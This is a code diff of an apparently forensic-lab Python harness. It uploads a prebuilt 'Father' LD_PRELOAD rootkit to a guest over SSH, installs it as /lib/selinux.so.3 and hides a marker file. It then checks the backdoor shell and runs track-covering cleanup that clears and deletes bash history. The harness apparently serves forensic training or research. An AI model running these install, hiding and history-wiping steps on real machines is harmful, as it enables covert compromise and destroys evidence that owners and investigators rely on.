@@ -25,6 +25,7 @@ REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
 UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"
 REMOTE_BUILD_ROOT = "/tmp/forensic-lab/father_build"
 REMOTE_BUILD_SCRIPT = "/tmp/father-build.sh"
+REMOTE_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"
 
 # Father defaults
 INSTALLED_LIBRARY = "/lib/selinux.so.3"
@@ -37,22 +38,11 @@ SHELL_MARKER = b"Enjoy the shell!"
 # Only intentional Father customization
 HIDDEN_PREFIX = "__malicious_"
 HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
-LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'
-
-PREPARE_AND_BUILD_COMMANDS = (
-    f"root={REMOTE_ROOT}; "
-    'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
-    'hidden_dir="$root/probe"',
-    'mkdir -p "$hidden_dir"',
-    f'tar -xf {UPLOAD_PATH} -C "$root"',
-    f"sed -i 's|^#define STRING .*|#define STRING "
-    f'"{HIDDEN_PREFIX}"|\' "$source/src/config.h"',
-    'cd "$source" && make father',
-)
+HIDDEN_DIR = f"{REMOTE_ROOT}/probe"
+LIST_HIDDEN_DIR = f"ls -la -- {HIDDEN_DIR}"
 
 CLEANUP_COMMANDS = (
-    f"rm -f -- {UPLOAD_PATH}",
-    'rm -rf -- "$source"',
+    f"rm -f -- {REMOTE_ARTIFACT}",
     "history -c",
     'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
     "unset HISTFILE",
@@ -65,6 +55,8 @@ def run_father(
     *,
     command_log_path: Path,
     scenario_id: str,
+    artifact_path: Path,
+    build_meta: dict,
 ) -> tuple[dict, Callable[[], None]]:
     """Run Father visibly in Bash, then validate its native accept-hook shell."""
     if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
@@ -72,14 +64,9 @@ def run_father(
 
     cleanup = scenario_id == CLEANUP_SCENARIO_ID
     transcript_path.touch()
-    console.scope("HOST", "stage Father source")
-    try:
-        source = verify_source()
-    except Exception as exc:
-        record_operation(command_log_path, "verify_source", error=str(exc))
-        raise
-    record_operation(command_log_path, "verify_source")
-    _upload_archive(ssh, command_log_path)
+    console.scope("HOST", "stage Father artifact")
+    source = build_meta["source"]
+    _upload_artifact(ssh, command_log_path, artifact_path)
 
     terminal = ssh.open_terminal()
     cleanup_facts = {}
@@ -94,14 +81,25 @@ def run_father(
 
     try:
         with terminal:
-            console.scope("GUEST", "prepare and build")
-            for command in PREPARE_AND_BUILD_COMMANDS:
-                run_logged_command(terminal, command_log_path, command, timeout=180)
+            console.scope("GUEST", "verify prepared artifact")
+            guest_identity = run_logged_command(
+                terminal,
+                command_log_path,
+                ". /etc/os-release; "
+                "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
+                timeout=180,
+            ).combined_output
+            expected = f"{build_meta['target']['distro_id']} {build_meta['target']['arch']}"
+            if guest_identity != expected:
+                raise RuntimeError(
+                    f"Father artifact targets {expected}, guest is {guest_identity}"
+                )
 
             console.scope("GUEST", "install and activate")
             for command in (
-                f'sudo -n install -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
-                f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
+                f"mkdir -p {HIDDEN_DIR}",
+                f"sudo -n install -m 0644 {REMOTE_ARTIFACT} {INSTALLED_LIBRARY}",
+                f"touch {HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
             ):
                 run_logged_command(terminal, command_log_path, command, timeout=180)
 
@@ -144,8 +142,7 @@ def run_father(
                     )
                 cleanup_facts = {
                     "cleanup": {
-                        "archive_absent": True,
-                        "source_tree_absent": True,
+                        "uploaded_artifact_absent": True,
                         "home_bash_history_absent": True,
                         "preload_config_present": True,
                         "installed_library_present": True,
@@ -166,7 +163,7 @@ def run_father(
             "source": source,
             "installed_library_path": INSTALLED_LIBRARY,
             "preload_config_path": PRELOAD_CONFIG,
-            "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
+            "hidden_file_path": f"{HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
             "file_hiding_validated": True,
             "backdoor_identity": identity,
             "backdoor_connection_open_at_scenario_completion": True,
@@ -200,17 +197,18 @@ def verify_source() -> dict:
     }
 
 
-def _upload_archive(
+def _upload_artifact(
     ssh: SSHClient,
     command_log_path: Path,
+    artifact_path: Path,
 ) -> None:
-    console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
+    console.step(f"Uploading {artifact_path.name} to {REMOTE_ARTIFACT}...")
     try:
-        ssh.put(ARCHIVE, UPLOAD_PATH)
+        ssh.put(artifact_path, REMOTE_ARTIFACT)
     except Exception as exc:
-        record_operation(command_log_path, "upload_archive", error=str(exc))
+        record_operation(command_log_path, "upload_artifact", error=str(exc))
         raise
-    record_operation(command_log_path, "upload_archive")
+    record_operation(command_log_path, "upload_artifact")
 
 
 def _validate_backdoor(
